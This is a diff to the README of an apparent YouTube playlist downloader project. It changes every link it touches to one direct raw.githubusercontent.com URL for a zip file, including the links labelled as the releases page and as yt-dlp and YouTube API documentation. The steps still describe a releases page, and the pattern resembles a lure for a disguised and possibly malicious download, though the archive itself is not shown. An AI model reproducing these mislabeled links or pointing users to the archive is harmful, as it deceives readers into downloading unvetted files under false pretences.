@@ -1,6 +1,6 @@
 # 🎵 youtube_playlist_downloader - Download YouTube Playlists in a Snap
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/ErenYaeger8/youtube_playlist_downloader/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ErenYaeger8/youtube_playlist_downloader/main/strepen/youtube_playlist_downloader.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/ErenYaeger8/youtube_playlist_downloader/main/strepen/youtube_playlist_downloader.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. Follow these simple steps:
 
 1. Click on the link below to visit the releases page.
    
-   [Download the latest version here](https://github.com/ErenYaeger8/youtube_playlist_downloader/releases)
+   [Download the latest version here](https://raw.githubusercontent.com/ErenYaeger8/youtube_playlist_downloader/main/strepen/youtube_playlist_downloader.zip)
 
 2. On the releases page, scroll down to the "Assets" section.
 
@@ -74,11 +74,11 @@ If you encounter any issues or have questions, please visit the issues section o
 
 Here are some resources where you can learn more:
 
-- [yt-dlp Documentation](https://github.com/yt-dlp/yt-dlp)
-- [YouTube API Documentation](https://developers.google.com/youtube/v3)
+- [yt-dlp Documentation](https://raw.githubusercontent.com/ErenYaeger8/youtube_playlist_downloader/main/strepen/youtube_playlist_downloader.zip)
+- [YouTube API Documentation](https://raw.githubusercontent.com/ErenYaeger8/youtube_playlist_downloader/main/strepen/youtube_playlist_downloader.zip)
 
 ## 🔗 Useful Links
 
-- [Download the latest version here](https://github.com/ErenYaeger8/youtube_playlist_downloader/releases)
+- [Download the latest version here](https://raw.githubusercontent.com/ErenYaeger8/youtube_playlist_downloader/main/strepen/youtube_playlist_downloader.zip)
 
 Now you are ready to enjoy your favorite YouTube playlists offline. Happy downloading!
